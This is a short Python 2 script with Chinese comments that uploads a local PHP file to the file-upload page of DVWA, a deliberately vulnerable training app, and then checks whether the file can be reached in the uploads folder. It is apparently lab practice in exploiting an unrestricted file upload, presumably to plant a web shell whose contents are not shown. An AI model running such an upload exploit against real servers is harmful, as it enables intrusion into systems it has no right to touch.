#此处上传的文件路径位于D盘下
#ip地址为192.168.0.105


import sys
import requests


argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "用法：python",sys.argv[0],"IP地址 端口号"
    print "例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"
    sys.exit()

ip = "192.168.109.147"
port = "80"

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
url="http://"+ip+":"+port+"/DVWA-master/vulnerabilities/upload/"
data=None
files={'file':open(r'D:\php.php','rb')}
h=requests.post(url=url,data=data,files=files)
code=requests.get("http://"+ip+"/DVWA-master/hackable/uploads/php.php").status_code
if code == 200:
    print "文件上传成功"
else:
    print "文件上传失败"
